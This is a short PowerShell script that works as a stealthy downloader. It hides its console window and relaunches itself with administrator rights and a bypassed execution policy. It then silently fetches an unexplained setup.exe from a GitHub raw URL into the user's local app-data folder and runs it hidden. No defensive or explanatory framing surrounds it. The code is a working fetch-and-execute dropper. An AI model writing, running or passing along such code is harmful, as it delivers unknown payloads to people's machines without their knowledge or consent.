

$ErrorActionPreference = 'Stop'


Add-Type -Namespace W32 -Name K -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]   public static extern bool   ShowWindow(IntPtr hWnd, int nCmdShow);
'@

function Hide-Console {
    $h = [W32.K]::GetConsoleWindow()
    if ($h -ne [IntPtr]::Zero) {
        [W32.K]::ShowWindow($h, 0) | Out-Null   # 0 = SW_HIDE
    }
}


Hide-Console


$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # relaunch elevated, hidden
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden -ArgumentList @(
        '-NoProfile'
        '-WindowStyle', 'Hidden'
        '-ExecutionPolicy', 'Bypass'
        '-File', "`"$PSCommandPath`""
    )
    exit
}


Hide-Console

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$startDir = Join-Path $env:LOCALAPPDATA 'start'
if (-not (Test-Path $startDir)) {
    New-Item -ItemType Directory -Path $startDir -Force | Out-Null
}

$url  = 'https://raw.githubusercontent.com/westoakstudios/Nothing/main/setup.exe'
$dest = Join-Path $startDir 'setup.exe'

Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing

Start-Process -FilePath $dest -WorkingDirectory $startDir -WindowStyle Hidden